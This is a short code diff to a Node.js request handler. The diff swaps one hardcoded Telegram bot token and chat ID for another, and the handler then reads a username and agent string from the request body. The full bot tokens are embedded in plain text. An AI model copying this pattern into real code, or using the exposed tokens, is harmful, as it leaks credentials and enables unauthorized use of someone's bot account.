@@ -3,8 +3,8 @@ module.exports = async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const token = '7689579621:AAE5d9HHm6Jpn-aIwX8GVZz8AYtNPKg7sA0';
-  const chatId = '-1003715904743';
+  const token = '8338192544:AAHrKxpty2ObdcTWgHSp_9CQStgRTjzXUxk';
+  const chatId = '-5050388811';
 
   try {
     const { username, agent } = req.body;
